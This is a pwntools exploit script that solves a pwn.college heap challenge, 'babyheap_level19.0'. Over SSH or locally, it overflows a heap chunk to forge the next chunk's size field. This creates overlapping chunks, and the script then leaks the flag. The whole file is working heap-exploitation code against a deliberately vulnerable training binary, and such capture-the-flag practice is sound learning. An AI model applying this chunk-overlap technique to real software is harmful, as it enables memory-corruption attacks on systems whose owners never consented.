from pwn import *
from time import sleep
context.binary=e=ELF("./babyheap_level19.0")
libc=e.libc
gs="""
set follow-fork-mode parent
b win
b *main+2156
"""
if args.LOCAL:
    p=e.process()
    if args.GDB:
        gdb.attach(p,gs)
        pause()
elif args.REMOTE:
    s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key",ignore_config=True)
    p=s.process("/challenge/babyheap_level19.0")
if args.DEBUG:
    context.log_level='debug'
def malloc(idx: int,size: int):
    p.sendlineafter(b"[*] Function",b"malloc")
    p.sendlineafter(b"Index: ",str(idx).encode())
    p.sendlineafter(b"Size: ",str(size).encode())
def free(idx: int):
    p.sendlineafter(b"[*] Function",b"free")
    p.sendlineafter(b"Index: ",str(idx).encode())
def safe_write(idx: int):
    p.sendlineafter(b"[*] Function",b"safe_write")
    p.sendlineafter(b"Index: ",str(idx).encode())
    return p.recvuntil(b"\n").rstrip()
def safe_read(idx: int,buffer: bytes):
    p.sendlineafter(b"[*] Function",b"safe_read")
    p.sendlineafter(b"Index: ",str(idx).encode())
    p.send(buffer)
    sleep(0.5)
malloc(0,0x3bf)
malloc(1,0x3bf)
malloc(2,0x600)
malloc(3,0x10)
safe_read(0,b"\x00"*0x3c0+p64(0x3d0)+p64(0x610+0x3d0+1)[:7])
free(1)
malloc(4,0x3bf)
p.sendline(b"read_flag")
safe_write(2)
p.interactive()